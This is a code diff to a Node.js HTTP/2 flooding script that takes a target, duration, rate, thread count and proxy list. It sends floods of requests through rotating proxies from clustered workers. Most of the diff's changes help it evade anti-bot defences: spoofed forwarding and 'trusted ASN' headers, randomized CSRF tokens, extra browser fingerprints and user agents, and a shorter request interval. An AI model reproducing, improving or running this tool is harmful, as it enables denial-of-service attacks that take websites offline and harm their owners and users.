@@ -9,12 +9,10 @@ const UserAgent = require('user-agents');
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function () {});
-
-if (process.argv.length < 7) { 
-    console.log(`Usage: target time rate thread proxyfile`); 
-    process.exit(); 
+if (process.argv.length < 7) {
+    console.log(`Usage: target time rate thread proxyfile`);
+    process.exit();
 }
-
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
@@ -32,7 +30,6 @@ function randstr(length) {
     }
     return result;
 }
-
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
@@ -40,7 +37,6 @@ const args = {
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
-
 const sig = [
     'ecdsa_secp256r1_sha256',
     'rsa_pkcs1_sha384',
@@ -61,20 +57,22 @@ const accept_header = [
     'application/xml',
     'application/pdf',
     'text/css',
-    'application/javascript'
+    'application/javascript',
+    'application/x-www-form-urlencoded',
+    'application/octet-stream'
 ];
 const lang_header = [
     'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-    'ko-KR',
-    'en-US',
-    'zh-CN',
-    'zh-TW',
-    'en-ZA',
-    'fr-FR',
-    'ja-JP',
-    'ar-EG',
-    'de-DE',
-    'es-ES'
+    'ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4',
+    'en-US,en;q=0.9',
+    'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+    'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+    'en-ZA,en;q=0.9',
+    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
+    'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
+    'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7'
 ];
 const encoding_header = [
     'gzip, deflate, br',
@@ -91,28 +89,34 @@ const cache_control = [
     'max-age=0',
     'no-cache',
     'no-store',
-    'must-revalidate'
+    'must-revalidate',
+    'no-transform',
+    'public'
 ];
 const sec_ch_ua = [
     '"Chromium";v="137", "Not/A)Brand";v="24"',
     '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"'
+    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
+    '"Firefox";v="115", "Gecko";v="20230718"',
+    '"Safari";v="17.1"'
 ];
 const sec_ch_ua_platform = [
     "Linux",
     "Windows",
     "macOS",
     "Android",
-    "iOS"
+    "iOS",
+    "Chrome OS",
+    "FreeBSD"
 ];
 const rateHeaders = [
     { "akamai-origin-hop": randstr(12) },
     { "proxy-client-ip": randstr(12) },
     { "via": randstr(12) },
     { "cluster-ip": randstr(12) },
-    { "user-agent": randstr(12) }
+    { "user-agent": randstr(12) },
+    { "x-forwarded-for": randstr(12) }
 ];
-
 let proxies = readLines(args.proxyFile);
 function shuffleArray(array) {
     for (let i = array.length - 1; i > 0; i--) {
@@ -121,7 +125,6 @@ function shuffleArray(array) {
     }
 }
 shuffleArray(proxies);
-
 const parsedTarget = url.parse(args.target);
 if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -135,7 +138,6 @@ if (cluster.isMaster) {
 } else {
     setInterval(runFlooder);
 }
-
 class NetSocket {
     HTTP(options, callback) {
         const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
@@ -169,28 +171,46 @@ class NetSocket {
         });
     }
 }
-
 const customUserAgents = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
   "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
-  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
+  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/115.0.1901.188 Safari/537.36"
 ];
-
 function generateUserAgent() {
     if (Math.random() < 0.5) {
         return new UserAgent({
             deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
-            platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android'])
+            platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android', 'Linux armv8', 'Chrome OS'])
         }).toString();
     } else {
         return randomElement(customUserAgents);
     }
 }
-
+function getTrustedASN() {
+    const trustedAsns = [
+        'AS15169', // Google
+        'AS16509', // Amazon
+        'AS8075', // Microsoft
+        'AS32934', // Facebook
+        'AS13335', // Cloudflare
+        'AS20940', // Akamai
+        'AS14618', // Amazon
+        'AS14907', // Facebook
+        'AS54113', // Fastly
+        'AS4230',  // DigitalOcean
+        'AS209',   // Amazon
+        'AS2914',  // NTT Communications
+        'AS174',   // Cogent Communications
+        'AS32934', // Facebook (Meta)
+    ];
+    return randomElement(trustedAsns);
+}
 const Socker = new NetSocket();
-
 function generateHeaders() {
     return {
         ":method": randomElement(methods),
@@ -203,17 +223,23 @@ function generateHeaders() {
         "accept-language": randomElement(lang_header),
         "cache-control": randomElement(cache_control),
         "sec-ch-ua": randomElement(sec_ch_ua),
-        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-mobile": Math.random() < 0.2 ? "?1" : "?0",
         "sec-ch-ua-platform": randomElement(sec_ch_ua_platform),
         "sec-fetch-dest": "document",
         "sec-fetch-mode": "navigate",
         "sec-fetch-site": "none",
         "sec-fetch-user": "?1",
         "upgrade-insecure-requests": "1",
-        "x-requested-with": "XMLHttpRequest"
+        "x-requested-with": "XMLHttpRequest",
+        "origin": parsedTarget.protocol + "//" + parsedTarget.host,
+        "referer": parsedTarget.protocol + "//" + parsedTarget.host + "/",
+        "dnt": "1",
+        "pragma": "no-cache",
+        "te": "trailers",
+        "x-csrftoken": randstr(24),
+        "x-asn": getTrustedASN()
     };
 }
-
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
@@ -287,12 +313,11 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, randomIntn(200, 501));
+            }, randomIntn(180, 350));
         });
         client.on("close", () => {
             client.destroy();
         });
     });
 }
-
 setTimeout(() => process.exit(1), args.time * 1000);
